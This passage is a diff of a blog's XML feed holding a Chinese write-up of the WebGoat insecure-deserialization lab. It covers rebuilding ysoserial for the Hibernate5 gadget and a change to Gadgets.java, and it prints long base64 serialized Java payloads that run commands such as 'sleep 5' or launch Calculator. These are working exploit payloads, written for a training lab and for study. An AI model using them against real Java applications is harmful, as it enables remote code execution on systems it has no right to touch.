QBABFqYXZhL2xhbmcvUHJvY2VzcwcANgEAB3dhaXRGb3IBAAMoKUkMADgAOQoANwA6AQANU3RhY2tNYXBUYWJsZQEAHXlzb3NlcmlhbC9Qd25lcjI4MzEwMDEyMDg1NDQ0AQAfTHlzb3NlcmlhbC9Qd25lcjI4MzEwMDEyMDg1NDQ0OwAhAAcAAgABAAkAAQAaAAsADAABAA0AAAACAA4ABAABAAUABgABABAAAAAvAAEAAQAAAAUqtwABsQAAAAIAEQAAAAYAAQAAAC8AEgAAAAwAAQAAAAUAEwA-AAAAAQAVABYAAgAQAAAAPwAAAAMAAAABsQAAAAIAEQAAAAYAAQAAADQAEgAAACAAAwAAAAEAEwA-AAAAAAABABcAGAABAAAAAQAZABoAAgAbAAAABAABABwAAQAVAB4AAgAQAAAASQAAAAQAAAABsQAAAAIAEQAAAAYAAQAAADgAEgAAACoABAAAAAEAEwA-AAAAAAABABcAGAABAAAAAQAfACAAAgAAAAEAIQAiAAMAGwAAAAQAAQAcAAgAKQAGAAEAEAAAACkAAwADAAAAFKcAAwFMuAAvEjG2ADVNLLYAO1exAAAAAQA8AAAAAwABAwACACMAAAACACQAJQAAAAoAAQAHACYAKAAJdXEAfgAuAAAB1Mr-ur4AAAA0ABsKAAIAAwcABAwABQAGAQAQamF2YS9sYW5nL09iamVjdAEABjxpbml0PgEAAygpVgcACAEAI3lzb3NlcmlhbC9wYXlsb2Fkcy91dGlsL0dhZGdldHMkRm9vBwAKAQAUamF2YS9pby9TZXJpYWxpemFibGUBABBzZXJpYWxWZXJzaW9uVUlEAQABSgEADUNvbnN0YW50VmFsdWUFceZp7jxtRxgBAARDb2RlAQAPTGluZU51bWJlclRhYmxlAQASTG9jYWxWYXJpYWJsZVRhYmxlAQAEdGhpcwEAJUx5c29zZXJpYWwvcGF5bG9hZHMvdXRpbC9HYWRnZXRzJEZvbzsBAApTb3VyY2VGaWxlAQAMR2FkZ2V0cy5qYXZhAQAMSW5uZXJDbGFzc2VzBwAZAQAfeXNvc2VyaWFsL3BheWxvYWRzL3V0aWwvR2FkZ2V0cwEAA0ZvbwAhAAcAAgABAAkAAQAaAAsADAABAA0AAAACAA4AAQABAAUABgABABAAAAAvAAEAAQAAAAUqtwABsQAAAAIAEQAAAAYAAQAAADwAEgAAAAwAAQAAAAUAEwAUAAAAAgAVAAAAAgAWABcAAAAKAAEABwAYABoACXB0AARQd25ycHcBAHhxAH4ABXNxAH4AAnEAfgAScQB-ACtxAH4AMng</span><br></pre></td></tr></table></figure>
+
+<p><code>/Users/seikei/.m2/repository/org/hibernate/hibernate-core/5.0.12.Final/hibernate-core-5.0.12.Final.jar!/org/hibernate/engine/spi/TypedValue.class</code></p>
+<p><img src="/2019/09/28/WebGoat-Deserialization/TypeValue.png" alt="TypeValue"></p>
+<p><code>/Users/seikei/.m2/repository/org/hibernate/hibernate-core/5.0.12.Final/hibernate-core-5.0.12.Final.jar!/org/hibernate/property/access/spi/GetterMethodImpl.class</code></p>
+<p><img src="/2019/09/28/WebGoat-Deserialization/GetterMethodImpl.png" alt="GetterMethodImpl"></p>
+<p><code>/Applications/IntelliJ IDEA.app/Contents/jbr/Contents/Home!/java.xml/jdk/xml/internal/JdkXmlFeatures.class</code></p>
+<p><img src="/2019/09/28/WebGoat-Deserialization/JdkXmlFeatures.png" alt="JdkXmlFeatures"></p>
+<h2 id="Java报错"><a href="#Java报错" class="headerlink" title="Java报错"></a>Java报错</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Error:java: error: release version 5 not supported</span><br></pre></td></tr></table></figure>
+
+<p>在maven中添加</p>
+<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">properties</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">java.version</span>&gt;</span>1.11<span class="tag">&lt;/<span class="name">java.version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">maven.compiler.source</span>&gt;</span>1.11<span class="tag">&lt;/<span class="name">maven.compiler.source</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">maven.compiler.target</span>&gt;</span>1.11<span class="tag">&lt;/<span class="name">maven.compiler.target</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">properties</span>&gt;</span></span><br></pre></td></tr></table></figure>]]></content>
   </entry>
   <entry>
     <title>理解Java反序列化-ysoserial URLDNS</title>
@@ -1069,77 +1179,6 @@
 <p><img src="/2019/12/06/Understand-Java-Deserialization-Ysoserial-URLDNS/Do-step-into-the-classes.png" alt="Do-step-into-the-classes"></p>
 <p>设置之后调试时不会自动跳过 <code>java.*</code> 和 <code>javax.*</code> 类。</p>
 ]]></content>
-  </entry>
-  <entry>
-    <title>WebGoat - 不安全的反序列化</title>
-    <url>/2019/09/28/WebGoat-Deserialization/</url>
-    <content><![CDATA[<p>Webgoat有一道不安全反序列化的题，如下：</p>
-<p><img src="/2019/09/28/WebGoat-Deserialization/webgoat-insecure-deserialization.png" alt="webgoat-insecure-deserialization.png"></p>
-<p>最初看到这题有点迷茫，不知道该怎么下手，正是迷茫才能从中学到反序列。从网上找了一些文章，自己也动手完全整了一遍，在此记录。<a id="more"></a>（网上特别详细的文章也没有，所以很多坑都是一步一个脚印踩上去的）</p>
-<p>最早的一篇讲解Webgoat反序列化的文章</p>
-<p><a href="https://medium.com/abn-amro-red-team/java-deserialization-from-discovery-to-reverse-shell-on-limited-environments-2e7b4e14fbef" target="_blank" rel="noopener">https://medium.com/abn-amro-red-team/java-deserialization-from-discovery-to-reverse-shell-on-limited-environments-2e7b4e14fbef</a></p>
-<p>上一篇文章的中文翻译，其中有部分作者的改动</p>
-<p><a href="https://blog.spoock.com/2018/10/31/reverse-shell-on-limited-environments/" target="_blank" rel="noopener">https://blog.spoock.com/2018/10/31/reverse-shell-on-limited-environments/</a></p>
-<p>另一篇文章</p>
-<p><a href="https://www.jianshu.com/p/0c45058e1723" target="_blank" rel="noopener">https://www.jianshu.com/p/0c45058e1723</a></p>
-<h2 id="正文开始"><a href="#正文开始" class="headerlink" title="正文开始"></a>正文开始</h2><p>安装Burp插件Java Deserialization Scanner，被动扫描发现存在不安全反序列化漏洞</p>
-<p><img src="/2019/09/28/WebGoat-Deserialization/deserialization-detect.png" alt="deserialization-detect"></p>
-<p>将请求Send request to DS - Manual testing 进行测试，发现存在Hibernate 5类型的反序列化</p>
-<p><img src="/2019/09/28/WebGoat-Deserialization/deserialization-manual-testing.png" alt="deserialization-manual-testing"></p>
-<p>然后将请求Send request to DS - Exploitation</p>
-<p>坑点一：使用原始的ysoserial.jar执行会报错，需要重新编译ysoserial</p>
-<p><img src="/2019/09/28/WebGoat-Deserialization/deserialization-exploiting.png" alt="deserialization-exploiting"></p>
-<p>详细报错信息如下所示</p>
-<p><img src="/2019/09/28/WebGoat-Deserialization/deserialization-error.png" alt="deserialization-error"></p>
-<p>在GitHub项目里下载源码，无需修改（因为源码里面已经添加了，但是作者并没有将它打包放在releases里）。GitHub地址：<a href="https://github.com/frohoff/ysoserial" target="_blank" rel="noopener">https://github.com/frohoff/ysoserial</a></p>
-<p><code>mvn clean package -DskipTests -Dhibernate5</code>即可构建代码（亲测不加-Dhibernate5不行)</p>
-<p>在插件中配置好构建完成的jar包路径，即可正常执行反序列化payload。</p>
-<p><img src="/2019/09/28/WebGoat-Deserialization/deserialization-exploiting-2.png" alt="deserialization-exploiting-2"></p>
-<p>坑点二：Mac下该Java 版本执行ysoserial.jar会提示</p>
-<blockquote>
-<p>com.nqzero.permit.Permit$InitializationFailed: initialization failed, perhaps you’re running with a security manager</p>
-</blockquote>
-<p><img src="/2019/09/28/WebGoat-Deserialization/java-version.png" alt="java-version"></p>
-<p><img src="/2019/09/28/WebGoat-Deserialization/ysoserial-hibernate-error.png" alt="ysoserial-hibernate-error"></p>
-<p>需要在pom.xml中将nqzero版本改为0.4（原始为0.3），重新使用maven构建即可使用。</p>
-<p><img src="/2019/09/28/WebGoat-Deserialization/nqzero.png" alt="nqzero.png"></p>
-<p>最开始碰到这个问题还以为在Mac下或者是Java版本太高不能用了，于是在Windows下执行，但是Windows执行后不能立马进行base64，还需要将ysoserial的输出保存在文件中，再将文件内容base64编码，觉得太麻烦。这个问题在谷歌中查也查不到解决办法。</p>
-<p>在IntelliJ IDEA中查看pom.xml文件时发现存在com.nqzero这个包，报错信息也是com.nqzero.permit.Permit$InitializationFailed，于是想着会不会是这个包版本不对，在maven库中一查，果然最新是0.4版本的，于是换成0.4后使用maven构建后可正常使用。</p>
-<p>构建时发现Java版本为1.6，我的maven没法构建，将Java版本改为1.7或者1.8即可正常构建。</p>
-<p>坑点三：在Linux中，ysoserial的反序列化无法使用sleep命令，其他命令能执行，这不知道为什么，但是在其他人文章中发现windows下的sleep能执行。目前没有发现任何解决办法，这个稍后动态调试一下看看到底是什么问题导致的。</p>
-<p><em>PS：但是Deserialization Scanner中的payload是sleep十秒的，目前不清楚是怎么实现的。</em></p>
-<p><strong>请求在执行sleep后并未等待命令结束就已经返回结果</strong>，若要等待进程结束后返回，需要针对ysoserial的执行命令进行调整，重新生成payload进行测试。</p>
-<p>在ysoserial/payloads/util/Gadgets.java:117-119，将代码做以下修改，可实现sleep等待5秒</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">String cmd = <span class="string">"java.lang.Process p=java.lang.Runtime.getRuntime().exec(\\"</span><span class="string">" +</span></span><br><span class="line"><span class="string">            command.replaceAll("</span>\\\\\\\\",<span class="string">"\\\\\\\\\\\\\\\\"</span>).replaceAll(<span class="string">"\\"</span><span class="string">", "</span>\\\\\\"<span class="string">") +</span></span><br><span class="line"><span class="string">            "</span>\\");p.waitFor();<span class="string">";</span></span><br></pre></td></tr></table></figure>
-
-<p>最终效果图如下：</p>
-<p><img src="/2019/09/28/WebGoat-Deserialization/deserialization-exploiting-success.png" alt="deserialization-exploiting-success"></p>
-<p><img src="/2019/09/28/WebGoat-Deserialization/webgoat-insecure-deserialization-complete.png" alt="webgoat-insecure-deserialization-complete"></p>
-<p>payload也贴一下吧</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcAUH2sHDFmDRAwACRgAKbG9hZEZhY3RvckkACXRocmVzaG9sZHhwP0AAAAAAAAB3CAAAAAIAAAACc3IAI29yZy5oaWJlcm5hdGUuZW5naW5lLnNwaS5UeXBlZFZhbHVlh4gUshmh5zwCAAJMAAR0eXBldAAZTG9yZy9oaWJlcm5hdGUvdHlwZS9UeXBlO0wABXZhbHVldAASTGphdmEvbGFuZy9PYmplY3Q7eHBzcgAgb3JnLmhpYmVybmF0ZS50eXBlLkNvbXBvbmVudFR5cGV-e2Nh9AnXEQIADVoAEmhhc05vdE51bGxQcm9wZXJ0eVoABWlzS2V5SQAMcHJvcGVydHlTcGFuTAAPY2FuRG9FeHRyYWN0aW9udAATTGphdmEvbGFuZy9Cb29sZWFuO1sAB2Nhc2NhZGV0AChbTG9yZy9oaWJlcm5hdGUvZW5naW5lL3NwaS9DYXNjYWRlU3R5bGU7TAARY29tcG9uZW50VHVwbGl6ZXJ0ADFMb3JnL2hpYmVybmF0ZS90dXBsZS9jb21wb25lbnQvQ29tcG9uZW50VHVwbGl6ZXI7TAAKZW50aXR5TW9kZXQAGkxvcmcvaGliZXJuYXRlL0VudGl0eU1vZGU7WwALam9pbmVkRmV0Y2h0ABpbTG9yZy9oaWJlcm5hdGUvRmV0Y2hNb2RlO1sADXByb3BlcnR5TmFtZXN0ABNbTGphdmEvbGFuZy9TdHJpbmc7WwATcHJvcGVydHlOdWxsYWJpbGl0eXQAAltaWwANcHJvcGVydHlUeXBlc3QAGltMb3JnL2hpYmVybmF0ZS90eXBlL1R5cGU7WwAhcHJvcGVydHlWYWx1ZUdlbmVyYXRpb25TdHJhdGVnaWVzdAAmW0xvcmcvaGliZXJuYXRlL3R1cGxlL1ZhbHVlR2VuZXJhdGlvbjtMAAl0eXBlU2NvcGV0ACpMb3JnL2hpYmVybmF0ZS90eXBlL1R5cGVGYWN0b3J5JFR5cGVTY29wZTt4cgAfb3JnLmhpYmVybmF0ZS50eXBlLkFic3RyYWN0VHlwZYdFsKQmRS24AgAAeHAAAAAAAAFwcHNyADNvcmcuaGliZXJuYXRlLnR1cGxlLmNvbXBvbmVudC5Qb2pvQ29tcG9uZW50VHVwbGl6ZXLAqqGhlZ9DmwIABEwADmNvbXBvbmVudENsYXNzdAARTGphdmEvbGFuZy9DbGFzcztMAAlvcHRpbWl6ZXJ0ADBMb3JnL2hpYmVybmF0ZS9ieXRlY29kZS9zcGkvUmVmbGVjdGlvbk9wdGltaXplcjtMAAxwYXJlbnRHZXR0ZXJ0ACpMb3JnL2hpYmVybmF0ZS9wcm9wZXJ0eS9hY2Nlc3Mvc3BpL0dldHRlcjtMAAxwYXJlbnRTZXR0ZXJ0ACpMb3JnL2hpYmVybmF0ZS9wcm9wZXJ0eS9hY2Nlc3Mvc3BpL1NldHRlcjt4cgA3b3JnLmhpYmVybmF0ZS50dXBsZS5jb21wb25lbnQuQWJzdHJhY3RDb21wb25lbnRUdXBsaXplcgh6nmX_Q4R7AgAFWgASaGFzQ3VzdG9tQWNjZXNzb3JzSQAMcHJvcGVydHlTcGFuWwAHZ2V0dGVyc3QAK1tMb3JnL2hpYmVybmF0ZS9wcm9wZXJ0eS9hY2Nlc3Mvc3BpL0dldHRlcjtMAAxpbnN0YW50aWF0b3J0ACJMb3JnL2hpYmVybmF0ZS90dXBsZS9JbnN0YW50aWF0b3I7WwAHc2V0dGVyc3QAK1tMb3JnL2hpYmVybmF0ZS9wcm9wZXJ0eS9hY2Nlc3Mvc3BpL1NldHRlcjt4cAAAAAAAdXIAK1tMb3JnLmhpYmVybmF0ZS5wcm9wZXJ0eS5hY2Nlc3Muc3BpLkdldHRlcjsmhfgDST23zwIAAHhwAAAAAXNyAD1vcmcuaGliZXJuYXRlLnByb3BlcnR5LmFjY2Vzcy5zcGkuR2V0dGVyTWV0aG9kSW1wbCRTZXJpYWxGb3JtrFu2VsndG1gCAARMAA5jb250YWluZXJDbGFzc3EAfgAUTAAOZGVjbGFyaW5nQ2xhc3NxAH4AFEwACm1ldGhvZE5hbWV0ABJMamF2YS9sYW5nL1N0cmluZztMAAxwcm9wZXJ0eU5hbWVxAH4AIHhwdnIAOmNvbS5zdW4ub3JnLmFwYWNoZS54YWxhbi5pbnRlcm5hbC54c2x0Yy50cmF4LlRlbXBsYXRlc0ltcGwJV0_BbqyrMwMABkkADV9pbmRlbnROdW1iZXJJAA5fdHJhbnNsZXRJbmRleFsACl9ieXRlY29kZXN0AANbW0JbAAZfY2xhc3N0ABJbTGphdmEvbGFuZy9DbGFzcztMAAVfbmFtZXEAfgAgTAARX291dHB1dFByb3BlcnRpZXN0ABZMamF2YS91dGlsL1Byb3BlcnRpZXM7eHBxAH4AJnQAE2dldE91dHB1dFByb3BlcnRpZXN0AAR0ZXN0cHBwcHBwcHBwcHVyABpbTG9yZy5oaWJlcm5hdGUudHlwZS5UeXBlO36vq6HklWGaAgAAeHAAAAABcQB-ABJwcHNxAH4AIgAAAAD_____dXIAA1tbQkv9GRVnZ9s3AgAAeHAAAAACdXIAAltCrPMX-AYIVOACAAB4cAAABtPK_rq-AAAANAA_CgACAAMHAAQMAAUABgEAQGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ydW50aW1lL0Fic3RyYWN0VHJhbnNsZXQBAAY8aW5pdD4BAAMoKVYHAD0BADN5c29zZXJpYWwvcGF5bG9hZHMvdXRpbC9HYWRnZXRzJFN0dWJUcmFuc2xldFBheWxvYWQHAAoBABRqYXZhL2lvL1NlcmlhbGl6YWJsZQEAEHNlcmlhbFZlcnNpb25VSUQBAAFKAQANQ29uc3RhbnRWYWx1ZQWtIJPzkd3vPgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBABJMb2NhbFZhcmlhYmxlVGFibGUBAAR0aGlzAQA1THlzb3NlcmlhbC9wYXlsb2Fkcy91dGlsL0dhZGdldHMkU3R1YlRyYW5zbGV0UGF5bG9hZDsBAAl0cmFuc2Zvcm0BAHIoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007W0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7KVYBAAhkb2N1bWVudAEALUxjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NOwEACGhhbmRsZXJzAQBCW0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7AQAKRXhjZXB0aW9ucwcAHQEAOWNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9UcmFuc2xldEV4Y2VwdGlvbgEApihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9kdG0vRFRNQXhpc0l0ZXJhdG9yO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7KVYBAAhpdGVyYXRvcgEANUxjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7AQAHaGFuZGxlcgEAQUxjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7AQAKU291cmNlRmlsZQEADEdhZGdldHMuamF2YQEADElubmVyQ2xhc3NlcwcAJwEAH3lzb3NlcmlhbC9wYXlsb2Fkcy91dGlsL0dhZGdldHMBABNTdHViVHJhbnNsZXRQYXlsb2FkAQAIPGNsaW5pdD4BABFqYXZhL2xhbmcvUnVudGltZQcAKgEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsMACwALQoAKwAuAQAHc2xlZXAgNQgAMAEABGV4ZWMBACcoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvUHJvY2VzczsMADIAMwoAKwA0AQARamF2YS9sYW5nL1Byb2Nlc3MHADYBAAd3YWl0Rm9yAQADKClJDAA4ADkKADcAOgEADVN0YWNrTWFwVGFibGUBAB55c29zZXJpYWwvUHduZXIxMzkwODU2MDU4NzM2MTYBACBMeXNvc2VyaWFsL1B3bmVyMTM5MDg1NjA1ODczNjE2OwAhAAcAAgABAAkAAQAaAAsADAABAA0AAAACAA4ABAABAAUABgABABAAAAAvAAEAAQAAAAUqtwABsQAAAAIAEQAAAAYAAQAAAC8AEgAAAAwAAQAAAAUAEwA-AAAAAQAVABYAAgAQAAAAPwAAAAMAAAABsQAAAAIAEQAAAAYAAQAAADQAEgAAACAAAwAAAAEAEwA-AAAAAAABABcAGAABAAAAAQAZABoAAgAbAAAABAABABwAAQAVAB4AAgAQAAAASQAAAAQAAAABsQAAAAIAEQAAAAYAAQAAADgAEgAAACoABAAAAAEAEwA-AAAAAAABABcAGAABAAAAAQAfACAAAgAAAAEAIQAiAAMAGwAAAAQAAQAcAAgAKQAGAAEAEAAAACkAAwADAAAAFKcAAwFMuAAvEjG2ADVNLLYAO1exAAAAAQA8AAAAAwABAwACACMAAAACACQAJQAAAAoAAQAHACYAKAAJdXEAfgAuAAAB1Mr-ur4AAAA0ABsKAAIAAwcABAwABQAGAQAQamF2YS9sYW5nL09iamVjdAEABjxpbml0PgEAAygpVgcACAEAI3lzb3NlcmlhbC9wYXlsb2Fkcy91dGlsL0dhZGdldHMkRm9vBwAKAQAUamF2YS9pby9TZXJpYWxpemFibGUBABBzZXJpYWxWZXJzaW9uVUlEAQABSgEADUNvbnN0YW50VmFsdWUFceZp7jxtRxgBAARDb2RlAQAPTGluZU51bWJlclRhYmxlAQASTG9jYWxWYXJpYWJsZVRhYmxlAQAEdGhpcwEAJUx5c29zZXJpYWwvcGF5bG9hZHMvdXRpbC9HYWRnZXRzJEZvbzsBAApTb3VyY2VGaWxlAQAMR2FkZ2V0cy5qYXZhAQAMSW5uZXJDbGFzc2VzBwAZAQAfeXNvc2VyaWFsL3BheWxvYWRzL3V0aWwvR2FkZ2V0cwEAA0ZvbwAhAAcAAgABAAkAAQAaAAsADAABAA0AAAACAA4AAQABAAUABgABABAAAAAvAAEAAQAAAAUqtwABsQAAAAIAEQAAAAYAAQAAADwAEgAAAAwAAQAAAAUAEwAUAAAAAgAVAAAAAgAWABcAAAAKAAEABwAYABoACXB0AARQd25ycHcBAHhxAH4ABXNxAH4AAnEAfgAScQB-ACtxAH4AMng</span><br></pre></td></tr></table></figure>
-
-<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>关键就两点：</p>
-<ol>
-<li>识别反序列化流量</li>
-<li>找到相应可利用执行命令的组件</li>
-</ol>
-<p>有时候需要特别修改ysoserial的内容来配合执行命令。</p>
-<h2 id="动态调试"><a href="#动态调试" class="headerlink" title="动态调试"></a>动态调试</h2><p>可在<code>/WebGoat-develop/webgoat-container/src/main/resources/application.properties:6</code> 修改端口等信息</p>
-<p><img src="/2019/09/28/WebGoat-Deserialization/application-properties.png" alt="application-properties"></p>
-<p>更改反序列化payload为弹计算器，反序列化payload如下：</p>
-<p>（Mac下计算器路径是<code>/Applications/Calculator.app/Contents/MacOS/Calculator</code>）</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcAUH2sHDFmDRAwACRgAKbG9hZEZhY3RvckkACXRocmVzaG9sZHhwP0AAAAAAAAB3CAAAAAIAAAACc3IAI29yZy5oaWJlcm5hdGUuZW5naW5lLnNwaS5UeXBlZFZhbHVlh4gUshmh5zwCAAJMAAR0eXBldAAZTG9yZy9oaWJlcm5hdGUvdHlwZS9UeXBlO0wABXZhbHVldAASTGphdmEvbGFuZy9PYmplY3Q7eHBzcgAgb3JnLmhpYmVybmF0ZS50eXBlLkNvbXBvbmVudFR5cGV-e2Nh9AnXEQIADVoAEmhhc05vdE51bGxQcm9wZXJ0eVoABWlzS2V5SQAMcHJvcGVydHlTcGFuTAAPY2FuRG9FeHRyYWN0aW9udAATTGphdmEvbGFuZy9Cb29sZWFuO1sAB2Nhc2NhZGV0AChbTG9yZy9oaWJlcm5hdGUvZW5naW5lL3NwaS9DYXNjYWRlU3R5bGU7TAARY29tcG9uZW50VHVwbGl6ZXJ0ADFMb3JnL2hpYmVybmF0ZS90dXBsZS9jb21wb25lbnQvQ29tcG9uZW50VHVwbGl6ZXI7TAAKZW50aXR5TW9kZXQAGkxvcmcvaGliZXJuYXRlL0VudGl0eU1vZGU7WwALam9pbmVkRmV0Y2h0ABpbTG9yZy9oaWJlcm5hdGUvRmV0Y2hNb2RlO1sADXByb3BlcnR5TmFtZXN0ABNbTGphdmEvbGFuZy9TdHJpbmc7WwATcHJvcGVydHlOdWxsYWJpbGl0eXQAAltaWwANcHJvcGVydHlUeXBlc3QAGltMb3JnL2hpYmVybmF0ZS90eXBlL1R5cGU7WwAhcHJvcGVydHlWYWx1ZUdlbmVyYXRpb25TdHJhdGVnaWVzdAAmW0xvcmcvaGliZXJuYXRlL3R1cGxlL1ZhbHVlR2VuZXJhdGlvbjtMAAl0eXBlU2NvcGV0ACpMb3JnL2hpYmVybmF0ZS90eXBlL1R5cGVGYWN0b3J5JFR5cGVTY29wZTt4cgAfb3JnLmhpYmVybmF0ZS50eXBlLkFic3RyYWN0VHlwZYdFsKQmRS24AgAAeHAAAAAAAAFwcHNyADNvcmcuaGliZXJuYXRlLnR1cGxlLmNvbXBvbmVudC5Qb2pvQ29tcG9uZW50VHVwbGl6ZXLAqqGhlZ9DmwIABEwADmNvbXBvbmVudENsYXNzdAARTGphdmEvbGFuZy9DbGFzcztMAAlvcHRpbWl6ZXJ0ADBMb3JnL2hpYmVybmF0ZS9ieXRlY29kZS9zcGkvUmVmbGVjdGlvbk9wdGltaXplcjtMAAxwYXJlbnRHZXR0ZXJ0ACpMb3JnL2hpYmVybmF0ZS9wcm9wZXJ0eS9hY2Nlc3Mvc3BpL0dldHRlcjtMAAxwYXJlbnRTZXR0ZXJ0ACpMb3JnL2hpYmVybmF0ZS9wcm9wZXJ0eS9hY2Nlc3Mvc3BpL1NldHRlcjt4cgA3b3JnLmhpYmVybmF0ZS50dXBsZS5jb21wb25lbnQuQWJzdHJhY3RDb21wb25lbnRUdXBsaXplcgh6nmX_Q4R7AgAFWgASaGFzQ3VzdG9tQWNjZXNzb3JzSQAMcHJvcGVydHlTcGFuWwAHZ2V0dGVyc3QAK1tMb3JnL2hpYmVybmF0ZS9wcm9wZXJ0eS9hY2Nlc3Mvc3BpL0dldHRlcjtMAAxpbnN0YW50aWF0b3J0ACJMb3JnL2hpYmVybmF0ZS90dXBsZS9JbnN0YW50aWF0b3I7WwAHc2V0dGVyc3QAK1tMb3JnL2hpYmVybmF0ZS9wcm9wZXJ0eS9hY2Nlc3Mvc3BpL1NldHRlcjt4cAAAAAAAdXIAK1tMb3JnLmhpYmVybmF0ZS5wcm9wZXJ0eS5hY2Nlc3Muc3BpLkdldHRlcjsmhfgDST23zwIAAHhwAAAAAXNyAD1vcmcuaGliZXJuYXRlLnByb3BlcnR5LmFjY2Vzcy5zcGkuR2V0dGVyTWV0aG9kSW1wbCRTZXJpYWxGb3JtrFu2VsndG1gCAARMAA5jb250YWluZXJDbGFzc3EAfgAUTAAOZGVjbGFyaW5nQ2xhc3NxAH4AFEwACm1ldGhvZE5hbWV0ABJMamF2YS9sYW5nL1N0cmluZztMAAxwcm9wZXJ0eU5hbWVxAH4AIHhwdnIAOmNvbS5zdW4ub3JnLmFwYWNoZS54YWxhbi5pbnRlcm5hbC54c2x0Yy50cmF4LlRlbXBsYXRlc0ltcGwJV0_BbqyrMwMABkkADV9pbmRlbnROdW1iZXJJAA5fdHJhbnNsZXRJbmRleFsACl9ieXRlY29kZXN0AANbW0JbAAZfY2xhc3N0ABJbTGphdmEvbGFuZy9DbGFzcztMAAVfbmFtZXEAfgAgTAARX291dHB1dFByb3BlcnRpZXN0ABZMamF2YS91dGlsL1Byb3BlcnRpZXM7eHBxAH4AJnQAE2dldE91dHB1dFByb3BlcnRpZXN0AAR0ZXN0cHBwcHBwcHBwcHVyABpbTG9yZy5oaWJlcm5hdGUudHlwZS5UeXBlO36vq6HklWGaAgAAeHAAAAABcQB-ABJwcHNxAH4AIgAAAAD_____dXIAA1tbQkv9GRVnZ9s3AgAAeHAAAAACdXIAAltCrPMX-AYIVOACAAB4cAAABwDK_rq-AAAANAA_CgACAAMHAAQMAAUABgEAQGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ydW50aW1lL0Fic3RyYWN0VHJhbnNsZXQBAAY8aW5pdD4BAAMoKVYHAD0BADN5c29zZXJpYWwvcGF5bG9hZHMvdXRpbC9HYWRnZXRzJFN0dWJUcmFuc2xldFBheWxvYWQHAAoBABRqYXZhL2lvL1NlcmlhbGl6YWJsZQEAEHNlcmlhbFZlcnNpb25VSUQBAAFKAQANQ29uc3RhbnRWYWx1ZQWtIJPzkd3vPgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBABJMb2NhbFZhcmlhYmxlVGFibGUBAAR0aGlzAQA1THlzb3NlcmlhbC9wYXlsb2Fkcy91dGlsL0dhZGdldHMkU3R1YlRyYW5zbGV0UGF5bG9hZDsBAAl0cmFuc2Zvcm0BAHIoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007W0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7KVYBAAhkb2N1bWVudAEALUxjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NOwEACGhhbmRsZXJzAQBCW0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7AQAKRXhjZXB0aW9ucwcAHQEAOWNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9UcmFuc2xldEV4Y2VwdGlvbgEApihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9kdG0vRFRNQXhpc0l0ZXJhdG9yO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7KVYBAAhpdGVyYXRvcgEANUxjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7AQAHaGFuZGxlcgEAQUxjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7AQAKU291cmNlRmlsZQEADEdhZGdldHMuamF2YQEADElubmVyQ2xhc3NlcwcAJwEAH3lzb3NlcmlhbC9wYXlsb2Fkcy91dGlsL0dhZGdldHMBABNTdHViVHJhbnNsZXRQYXlsb2FkAQAIPGNsaW5pdD4BA